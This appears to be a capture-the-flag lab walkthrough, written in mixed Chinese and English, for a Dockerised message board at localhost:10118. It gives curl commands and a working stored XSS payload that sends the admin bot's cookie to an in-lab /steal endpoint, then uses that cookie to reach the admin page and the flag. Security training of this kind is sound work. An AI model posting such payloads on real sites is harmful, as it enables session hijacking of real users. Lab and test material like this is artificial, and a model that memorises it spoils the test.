# WEB-18: Stored XSS Session Theft

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-18 |
| 名称 | Stored XSS Session Theft |
| 技术/CVE | Stored XSS |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10118 |

## 场景概述
- 技术：Stored XSS
- 难度：L1
- 交付方式：docker
- 入口端口：10118
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | Stored XSS (Cross-Site Scripting) |
| Difficulty | L1 |
| Port | 10118 |
| Path | scenarios/web/stored-xss/ |
| Type | docker |
| Service | Community Message Board |

### Attack Path Summary
```
Post XSS payload → Admin bot visits → Cookie stolen → Use stolen cookie → Access admin → Flag
```

### Prerequisites

#### Knowledge
- XSS类型 (XSS types): Understanding stored (persistent) cross-site scripting vs reflected and DOM-based
- Cookie/Session机制 (Cookie/session mechanism): How session tokens are stored and transmitted in HTTP headers
- XSS payload绕过 (XSS payload bypass): Crafting payloads that evade input filters
- eval/script注入 (eval/script injection): Using script tags and JavaScript execution for cookie exfiltration

#### Tools
- curl: Post messages and retrieve stolen cookies via HTTP requests
- Burp Suite: Intercept and modify requests for testing
- Browser: View the application UI and observe admin bot behavior

### Step-by-Step Exploitation

#### Step 1: Access the Message Board

Open the community message board.

```bash
curl http://localhost:10118/
```

#### Step 2: Observe Admin Bot Behavior

Note that the home page mentions an admin bot visits every 30 seconds to review new messages.

#### Step 3: Post an XSS Payload

Submit a message containing a JavaScript payload that exfiltrates cookies to a collector endpoint.

```bash
curl -X POST http://localhost:10118/post \
  -d 'name=hacker&message=<script>document.location="/steal?c="+document.cookie</script>'
```

#### Step 4: Wait for Admin Bot and Retrieve Stolen Cookies

Wait up to 30 seconds for the admin bot to visit the page, then check the stolen cookies endpoint.

```bash
curl http://localhost:10118/view_stolen
```

The admin token is in the format `admin_token=flag{...}`.

#### Step 5: Use Stolen Admin Cookie

Access the admin dashboard using the stolen cookie value.

```bash
curl -b "admin_token=<FLAG_VALUE>" http://localhost:10118/admin
```

#### Step 6: Flag Confirmation

The flag is displayed in the admin dashboard. The `admin_token` cookie value itself IS the flag (self-verifying).

### Flag Location
- The `admin_token` cookie value IS the flag (self-verifying)
- Also displayed on the admin dashboard page

### Verification Commands
```bash
# Post XSS payload
curl -s -X POST http://localhost:10118/post \
  -d 'name=hacker&message=<script>document.location="/steal?c="+document.cookie</script>'
# Wait ~30s for admin bot, then check stolen cookies
curl -s http://localhost:10118/view_stolen | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Stored XSS input surface and browser session model |
| 侦察与前置条件 | Persistent rendering sink and victim-session delivery path |
| 核心漏洞与利用 | Inject a stored JavaScript payload |
| 权限、横向或影响 | Victim session/token theft |
| 验证 | Use the stolen session evidence to access the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
